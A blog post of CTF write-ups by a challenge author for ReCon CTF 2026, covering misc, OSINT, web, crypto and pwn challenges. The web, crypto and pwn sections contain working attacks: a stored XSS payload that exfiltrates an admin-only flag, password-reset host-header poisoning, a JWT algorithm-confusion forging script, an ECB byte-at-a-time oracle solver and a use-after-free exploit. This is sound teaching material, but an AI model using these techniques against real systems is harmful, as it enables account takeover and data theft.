---
title: "ReConCTF 26 Writeups"
description: "writeups for ReCon CTF 2026, including detailed solutions for Misc, Web, and other challenges."
date: 2026-05-09
tags: ["ctf", "writeups", "reconctf26"]
cover: "/static/covers/reconctf26.JPG"
draft: false
---

# ReCon CTF 2026 writeups - swarnimbandekar

## 1. Misc
### 0xDEADBEEF.mp4
 
>Corrupted? Maybe.
Or maybe you forgot how to read.

You were given a mp4 video that was looked like a glitch video.
[Download Video](https://github.com/swarnimbandekar/reconctf2026/raw/refs/heads/main/misc/0xDEADBEEF.mp4/0xDEADBEEF.mp4)

Many of you solved this challenge only when the hints were given, well "⬡" that referred to a "hexa" and colorful "hue" boxes that you were getting in the video was a [Hexahue](https://www.dcode.fr/hexahue-cipher).
The intended way to solve this challenge is to break this video into `multiple frames`. As any video out there is a bunch full of images running in sequence. Playing this video in a video player would be the worst decision that you would ever take.

1. get multiple frames of this video from any tool online, I would say [ezgif](https://ezgif.com/video-to-jpg) with a 30 fps (frames per second)
2. you see a bunch of hexahue blocks in sequence, then find a decoder for that or go to [dcode.fr](https://www.dcode.fr/hexahue-cipher)
3. Then you match each one of them in a sequence and decrypt ![image](https://hackmd.io/_uploads/BJ71-Ti0-g.png)


Flag: `recon{G1I7CHED,R3C0NN}`

### Out of Sight, In Scope
 
>`HZHRDzujwX`
>No badge, no name, no colored frame
still running half the server’s game.

I genuninly felt this one was a bit tricky one, because I took this challenge from 0xfun ctf when I had to solve this challenge and I had fun solving this.
Description has some words such as `server` `color` `badge` these directly hint to discord (sorry if you have never heard about it)

1. craft a discord invite url https://discord.gg/HZHRDzujwX
2. you are landed into the recon server. The challenge title says `out of sight, in scope` and when you combine this with the description you get an idea of discord roles which arent visible to your eyes, nor they have been given to any of the users on the server.
3. you can get the hidden role either using a mod ![WhatsApp Image 2026-04-21 at 10.44.50 PM](https://hackmd.io/_uploads/BkcFB6i0Wl.jpg)
4. without mod `/id @rec` ![image](https://hackmd.io/_uploads/BkqhSasC-x.png)

Flag: `recon{y0u_M16h7_b3_A_D3ve10P3r_gngg!!!!!!}`

---

## 2. OSINT
### Before Recon

>Recon wasn’t always what it is now.
>https://dev-recon.vercel.app/

when you open the website you see all pages are working other but only `team.html` page was showing a `404` which says the page has been removed. There is a p cool wayback called [Web Archive](https://web.archive.org/) where stores all the snapshots of a the website.

1. go to https://web.archive.org/ and search for the broken url in there `https://dev-recon.vercel.app/team.html` ![image](https://hackmd.io/_uploads/SJQqDasAWe.png)
2. you see the email of the intern is `iworkatrecon@outlook.com` then you run a `sherlock` on that username or you can also think a popular place where interns mess-up `https://github.com/iworkatrecon/`
3. in github you get a repo named `secret-infra` in which you scroll into commit history and see `.env` with whitespace, go to any [whitespace decoder](https://www.dcode.fr/whitespace-language) online. ![image](https://hackmd.io/_uploads/B1hgcTsAZl.png)
4. You finally get the flag at https://pastebin.com/7EMdVHeW

Flag: `recon{aRch1V3_wA5_7h3_vu1N_8774821}`

### Where is Franklin

>`Ayy, where Franklin at?`
Last seen ghosting calls and roaming the streets like he owns the place. You’ve got eyes on the scene. Now prove you know the map better than him. Pick the spot where he’s hiding… or keep wandering like Lamar.

This challenge was picked up from https://gtaguessr.com/
You can look out for the location there, or another option was to load GTA-V in free roam mode and search for the location :wink: ![image](https://hackmd.io/_uploads/rJeYJRiRbg.png)

Flag: `recon{4hH!!_y3aH_y0u_f0un6_fR4nk1in}`

---

## 3. Web
### Last Ticket

>Recon 2026 is almost sold out. The store is still live, but things don’t feel quite right. Prices fluctuate, and a few users swear they saw something different just moments ago. There's one lucky person among us.

once you login to the website, your account is at $29 and you have to buy the conference pass worth $99
1. if you apply the coupon `FREEPASS` it shows has reached the maximim limit.
2. capture request through burp suite and add multiple copies to repeater and group them together and send a prallel attack (race condition) ![image](https://hackmd.io/_uploads/B16sWRj0bx.png)
3. Now when you come back to the website and check you will be having excess money $$$$
4. as the flag was dynamic, each team gets different flag.![image_2_69](https://hackmd.io/_uploads/Sk-VX0oRWe.png)
 
Flag: `recon{dynamic}`

### Side Effects

>Not every flaw announces itself.
Sometimes, it’s just a series of perfectly reasonable decisions — each one harmless on its own.
Until they aren’t.

Iliterally took me one whole day to make this challenge.
once you register and login, check the page source, there's a comment leaking `/api/user?id=USERID`

1. hit `/api/user?id=1` and you get admin's email: `admin@sideeffects.local`
2. send a password reset for that email but inject `X-Forwarded-Host: <your-ngrok/webhook>` header in the request. the server simulates the admin clicking the link and sends the reset token to YOUR server instead.
3. use the leaked token to reset admin's password at `/reset?token=<token>`  you now own the admin account.
4. login as admin, but `/admin/flag` is still blocked (internal only). so go back to your normal user account, update your bio with:
```html
<script>fetch('/admin/flag').then(r=>r.json()).then(d=>{fetch('/leak',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d.flag})})})</script>
```
5. trigger the admin bot to visit your profile: `GET /admin/visit?id=<your_id>` it executes your XSS payload with internal access and leaks the flag.
6. grab the flag from the `leak_id` returned in the response: `GET /leak/<leak_id>`

Flag: `recon{dynamic}`

### Thread Pull

>The admin was on their way to Recon 2026.
They didn’t quite make it.
What remains is a system full of small decisions, half-finished steps, and things that almost make sense.
Pull the right thread, and the rest might follow.
`user : password`

login, then follow the levels from the dashboard.
[CyberChef](https://gchq.github.io/CyberChef/) is your saviour.

1. **Level 1** - decode the hex string to get ASCII, then double base64 decode it. answer is `cookie`
2. **Level 2** — the emoji string XORed with the previous level key (`cookie`) gives you the token: `access_admin` you can use https://txtmoji.com/
3. **Level 3** — ROT13 decode `uggcf://cnfgrova.pbz/rOcO8u6Q` to get a pastebin link, which has the final key: `F1nAL_k2yYY!!!`
4. submit the final key → reveals the internal keys path `/internal/keys_<random>/`
5. visit that path → grab `public.pem`
6. forge a JWT using **algorithm confusion** (switch RS256 → HS256, sign with the public key as HMAC secret, set `role: "admin"`)
7. replace your `sess` cookie with the forged token, visit `/admin/flag` → flag

python solver (update your key and url:port)
```
import base64
import json
import hmac
import hashlib
import requests

# Paste the public key here (including the BEGIN and END lines)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqNXFTqgGFKoPnso8zYEa
g8wZaDwTEL3xO/DvxBEUd0U7xLY3ksRuWasOXfw9s5QS5GqDM4gVNq20pGFBoKI2
29BjTkX+D0aPEAf95kCTsrqeGPB8L+Gw1RiiTA1Rl7kz2SgP9y/hjeo/O4uO9TeV
dbjg3sAv7IyhUGlplIEZ4rfJFu3msdrgwUSIrws/VIahVl2sXXSCP9zqrILLVKOJ
FDtY4LLAaf3iICX3gNOcnl0HUr+QEXgMAbG/E8Xh4Ce7YbtR4iNkcSHFKIfqh29F
aUF8eLsmarjBCMHyDUYHGVcOqfrfNXL3f/zF2hEuqYcJMKeCCWrCiaohjUKnbXnQ
DQIDAQAB
-----END PUBLIC KEY-----"""

TARGET = "http://localhost:3003"

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).replace(b'=', b'').decode('utf-8')

def generate_admin_token(pub_key):
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"username": "admin", "role": "admin"}

    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))

    msg = f"{header_b64}.{payload_b64}"
    
    # Strip \r to make sure we use exactly \n as generated by Node on Linux
    exact_pub_key = pub_key.replace('\r', '') + "\n"

    # The Vulnerability: We sign using HS256 (HMAC) but use the server's
    # PUBLIC KEY string as our secret key.
    signature = hmac.new(exact_pub_key.encode('utf-8'), msg.encode('utf-8'), hashlib.sha256).digest()
    sig_b64 = b64url_encode(signature)

    return f"{msg}.{sig_b64}"

if __name__ == "__main__":
    token = generate_admin_token(public_key)
    print(f"\n[+] Crafted Admin JWT Token:\n{token}")
    
    # Try to get the flag directly
    cookies = {"sess": token}
    
    print(f"\n[*] Requesting {TARGET}/admin/flag ...")
    resp = requests.get(f"{TARGET}/admin/flag", cookies=cookies, timeout=10)
    print(f"[*] Status: {resp.status_code}")
    print(f"[*] Response:\n{resp.text}")

```

![image](https://hackmd.io/_uploads/Syu49Ai0bx.png)


Flag: `recon{t00K_n0_loN6_ T0_pU1L__!}`

---

## 4. Cryptography
### SameFlow

>An old encryption terminal survived the shutdown.
It still takes requests, still produces results, and still guards something valuable.
If there is a pattern in its behavior, it does not intend to show you.

the server encrypts your input using AES in one of 3 modes (CTR/CBC/ECB), rotating each query. it prepends a random prefix and appends a secret to your plaintext before encrypting.

1. use option 1 (entropy probe) to figure out which mode is coming next first byte of the leak `% 3` gives you the mode. use option 2 (flush) to skip until you hit ECB.
2. find the unknown prefix length by sending increasing `A`s through ECB until two adjacent ciphertext blocks match.
3. now do **ECB byte-at-a-time** to recover the 16-byte `session_secret` appended to every plaintext.
4. derive the CTR nonce: `SHA256(session_secret)[:8]`
5. sync `last_cb` with one more ECB encrypt, then wait for CTR mode and request the encrypted flag.
6. reconstruct the CTR keystream by encrypting `nonce || counter` blocks through the ECB oracle, XOR with the flag ciphertext, strip the prefix/secret/padding and then you get the flag.

python solver (update your ip:port)

```
#!/usr/bin/env python3
"""
Solver for SameFlow.

Attack chain:
  1. Discover unknown prefix length via ECB repeated-block analysis
  2. ECB byte-at-a-time to recover session_secret (16 bytes)
  3. Derive CTR nonce = SHA256(session_secret)[:8]
  4. Track last_cb, get flag encrypted in CTR mode
  5. Reconstruct CTR keystream block-by-block via ECB oracle
  6. XOR to decrypt flag
"""

from pwn import *
import struct
import hashlib


def solve(host, port):
    io = remote(host, port)
    io.recvuntil(b'> ')

    # ═══════════════════════════════════════════════
    #  Interaction helpers
    # ═══════════════════════════════════════════════

    def probe():
        """Peek at entropy state. Free, does not advance counter."""
        io.sendline(b'1')
        io.recvuntil(b'[state] ')
        h = io.recvline().strip().decode()
        io.recvuntil(b'> ')
        return bytes.fromhex(h)

    def stir():
        """Advance state counter by 1. Free, no budget cost."""
        io.sendline(b'2')
        io.recvuntil(b'> ')

    def enc(pt):
        """Encrypt data. Costs 1 query budget. Returns raw ciphertext bytes."""
        io.sendline(b'3')
        io.recvuntil(b'Data (hex): ')
        io.sendline(pt.hex().encode())
        io.recvuntil(b'[out] ')
        ct = bytes.fromhex(io.recvline().strip().decode())
        io.recvuntil(b'> ')
        return ct

    def flag_enc():
        """Get encrypted flag. Costs 1 flag + 1 query budget."""
        io.sendline(b'4')
        data = io.recvuntil(b'> ')
        if b'[err]' in data:
            return None
        try:
            i = data.index(b'[out] ') + 6
            j = data.index(b'\n', i)
            return bytes.fromhex(data[i:j].strip().decode())
        except (ValueError, IndexError):
            return None

    def wait_mode(target):
        """Probe + stir until the upcoming mode equals target (0=CTR,1=CBC,2=ECB)."""
        while True:
            leak = probe()
            if leak[0] % 3 == target:
                return
            stir()

    def ecb(pt):
        """Encrypt only in ECB mode. Waits for ECB, then encrypts."""
        wait_mode(2)
        return enc(pt)

    # ═══════════════════════════════════════════════
    #  STEP 1 — Determine unknown prefix length
    # ═══════════════════════════════════════════════
    #
    # We send increasing filler to the ECB oracle. When two adjacent
    # ciphertext blocks match (identical A*16 blocks), the filler has
    # pushed past the prefix alignment. Prefix length = 48 - filler_len.
    #
    # prefix_len ∈ [5,15], so first match happens at filler ∈ [33,43].

    log.info("[1/5] Determining unknown prefix length...")
    plen = None
    for n in range(33, 49):
        ct = ecb(b'A' * n)
        blks = [ct[i:i+16] for i in range(0, len(ct), 16)]
        if any(blks[j] == blks[j+1] for j in range(len(blks) - 1)):
            plen = 48 - n
            break

    if plen is None:
        log.error("Prefix detection failed!")
        return
    log.success(f"prefix_len = {plen}")

    # Bytes needed to block-align past the prefix
    pad_n = (16 - plen % 16) % 16
    # Block index right after the prefix-aligned block
    target_blk_idx = 1

    # ═══════════════════════════════════════════════
    #  STEP 2 — ECB byte-at-a-time: recover session_secret
    # ═══════════════════════════════════════════════
    #
    # For each byte i of session_secret (16 bytes):
    #   1. Send filler of length (pad_n + 15 - i)
    #      → target block = E(A*(15-i) || secret[0..i])
    #   2. Guess g ∈ [0,255]: send filler + known_bytes + g
    #      → check block = E(A*(15-i) || known_bytes || g)
    #   3. When check == target, we found secret[i].

    log.info("[2/5] Recovering session_secret via ECB byte-at-a-time...")
    secret = b''
    for byte_i in range(16):
        fill = pad_n + 15 - byte_i

        # Get target block
        target = ecb(b'A' * fill)[target_blk_idx*16 : (target_blk_idx+1)*16]

        found = False
        for g in range(256):
            ct = ecb(b'A' * fill + secret + bytes([g]))
            guess = ct[target_blk_idx*16 : (target_blk_idx+1)*16]
            if guess == target:
                secret += bytes([g])
                log.info(f"  [{byte_i+1:2d}/16] 0x{g:02x}  acc={secret.hex()}")
                found = True
                break

        if not found:
            log.error(f"Byte {byte_i} recovery failed!")
            return

    nonce = hashlib.sha256(secret).digest()[:8]
    log.success(f"session_secret = {secret.hex()}")
    log.success(f"nonce (SHA256) = {nonce.hex()}")

    # ═══════════════════════════════════════════════
    #  STEP 3 — Track last_cb & get flag in CTR mode
    # ═══════════════════════════════════════════════
    #
    # All modes set last_cb = ct[-16:]. After syncing via one more ECB
    # encryption, we know last_cb exactly. Then we advance to a CTR
    # state and request the encrypted flag.

    log.info("[3/5] Syncing last_cb and requesting flag in CTR mode...")

    # Sync: one more ECB encrypt → last_cb = ct[-16:]
    sync_ct = ecb(b'X' * 16)
    last_cb = sync_ct[-16:]
    log.info(f"  Synced last_cb = {last_cb.hex()}")

    ct_flag = None
    ctr_start = None

    for attempt in range(5):
        wait_mode(0)                        # Wait for CTR
        saved_cb = last_cb
        ct = flag_enc()
        if ct is None:
            # Counter might not be high enough yet — stir more
            for _ in range(30):
                stir()
            continue
        ct_flag = ct
        ctr_start = int.from_bytes(saved_cb[:8], 'big')
        last_cb = ct_flag[-16:]             # Update tracking
        log.success(f"  Got flag in CTR mode ({len(ct_flag)} bytes)")
        log.success(f"  ctr_start = {ctr_start}")
        break

    if ct_flag is None:
        log.error("Could not get flag in CTR mode!")
        return

    # ═══════════════════════════════════════════════
    #  STEP 4 — Reconstruct CTR keystream via ECB oracle
    # ═══════════════════════════════════════════════
    #
    # Each keystream block = AES_ECB(nonce || counter).
    # We craft an ECB query where block[1] = nonce || counter,
    # and read ct[16:32] to get the encrypted block.

    log.info("[4/5] Reconstructing CTR keystream via ECB oracle...")
    ks = b''
    num_blocks = (len(ct_flag) + 15) // 16

    for i in range(num_blocks):
        ctr_val = (ctr_start + i) % (2 ** 64)
        ctr_block = nonce + struct.pack('>Q', ctr_val)

        # Place ctr_block at block index 1 by aligning past prefix
        pt_base = b'\x00' * pad_n + ctr_block
        ct = ecb(pt_base)
        ks += ct[16:32]                     # Block 1 = E(ctr_block)

    ks = ks[:len(ct_flag)]

    # ═══════════════════════════════════════════════
    #  STEP 5 — Decrypt the flag
    # ═══════════════════════════════════════════════

    log.info("[5/5] Decrypting flag...")

    pt_padded = bytes(a ^ b for a, b in zip(ct_flag, ks))
    # pt_padded = prefix || flag || session_secret || PKCS7_padding
    pad_v = pt_padded[-1]
    if not (1 <= pad_v <= 16):
        log.error(f"Invalid PKCS7 padding byte: {pad_v}")
        return
    pt = pt_padded[:-pad_v]                 # Strip PKCS7
    flag = pt[plen:-16]                     # Strip prefix and session_secret

    log.success("═" * 50)
    log.success(f"FLAG: {flag.decode(errors='replace')}")
    log.success("═" * 50)

    io.close()


if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser(description='SameFlow Solver')
    p.add_argument('host', nargs='?', default='localhost')
    p.add_argument('port', nargs='?', type=int, default=1337)
    a = p.parse_args()
    solve(a.host, a.port)

```
![image](https://hackmd.io/_uploads/BkUD2CsAZg.png)

Flag: recon{dynamic}



---

## 5. PWN
### Palimpsest

>The Archive keeps rewriting the future, but some memories survive the revisions.Fork a timeline. Trust the copy. Ask an oracle what changed.Somewhere between the copied past and the rewritten present, one erased line still points at the truth.

I tried to keep this challenge as easy as possible but this thing turned out to be hard to solve. a PIE binary serves a "timeline archive" over TCP. each timeline has 8 slots holding heap objects= **Cell** (raw 56-byte buffer), **Oracle** (function pointer + message), or **Portal** (length + arbitrary target pointer). `fork` copies a timeline via `memcpy` but **never bumps refcounts**, so freeing a shared object in one timeline leaves a dangling pointer in the other.

1. create two cells in timeline 0, then `fork 1`. in timeline 1, `drop 0` and `new oracle 2` — the freed cell chunk gets reclaimed as an oracle. back in timeline 0, slot 0 still thinks it's a cell, so `read 0` dumps `Oracle.speak` (`oracle_whisper`) → **PIE base leaked**.
2. in timeline 1, `drop 1` and `new portal 3`. same trick — timeline 0 slot 1 is a stale cell overlapping the new portal. `ink 1` writes into `Cell.data` which overlaps `Portal.len` and `Portal.target`. set `target = &timelines[1].slots[2].obj` and `peer 3` leaks the **heap address** of the oracle.
3. repoint the portal at `oracle_heap + 8` (the `speak` function pointer). `pour 3` overwrites it with `reveal_flag`.
4. `speak 2` — oracle calls `reveal_flag` instead of `oracle_whisper`, and then the flag prints ;-;

```
from pwn import *
import argparse


BIN_PATH = "./palimpsest_dbg"
context.binary = elf = ELF(BIN_PATH, checksec=False)
context.log_level = "info"

TIMELINE_SIZE = 8 * 16
SLOT_SIZE = 16


def send_cmd(io, cmd):
    io.sendlineafter(b"$ ", cmd.encode())


def send_hex(io, data):
    io.sendlineafter(b"hex?\n", data.hex().encode())


def read_hex(io):
    return bytes.fromhex(io.recvline().strip().decode())


def slot_obj_addr(timeline_idx, slot_idx):
    return elf.sym["timelines"] + timeline_idx * TIMELINE_SIZE + slot_idx * SLOT_SIZE


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8009)
    parser.add_argument("--remote", action="store_true")
    parser.add_argument("--bin", default=BIN_PATH)
    args = parser.parse_args()

    global elf
    context.binary = elf = ELF(args.bin, checksec=False)

    if args.remote:
        io = remote(args.host, args.port)
    else:
        io = remote(args.host, args.port)

    send_cmd(io, "new cell 0")
    send_cmd(io, "new cell 1")
    send_cmd(io, "fork 1")

    send_cmd(io, "use 1")
    send_cmd(io, "drop 0")
    send_cmd(io, "new oracle 2")

    send_cmd(io, "use 0")
    send_cmd(io, "read 0")
    leak = u64(read_hex(io)[:8])
    elf.address = leak - elf.sym["oracle_whisper"]
    log.success(f"PIE base = {hex(elf.address)}")

    send_cmd(io, "use 1")
    send_cmd(io, "drop 1")
    send_cmd(io, "new portal 3")

    target = slot_obj_addr(1, 2)
    payload = p64(8) + p64(target)
    payload = payload.ljust(56, b"\x00")

    send_cmd(io, "use 0")
    send_cmd(io, "ink 1")
    send_hex(io, payload)

    send_cmd(io, "use 1")
    send_cmd(io, "peer 3")
    oracle_heap = u64(read_hex(io)[:8])
    log.success(f"oracle heap = {hex(oracle_heap)}")

    payload = p64(8) + p64(oracle_heap + 8)
    payload = payload.ljust(56, b"\x00")

    send_cmd(io, "use 0")
    send_cmd(io, "ink 1")
    send_hex(io, payload)

    send_cmd(io, "use 1")
    send_cmd(io, "pour 3")
    send_hex(io, p64(elf.sym["reveal_flag"]))

    send_cmd(io, "speak 2")
    io.interactive()


if __name__ == "__main__":
    main()

```

![image](https://hackmd.io/_uploads/HJ0-R0iRWe.png)

Flag: `recon{dynamic}`

---

## GoodBye
glad you enjoyed ReConCTF, and thank you for showing love on linkedin posts.

[swarnimbandekar](https://swarnimbandekar.github.io/)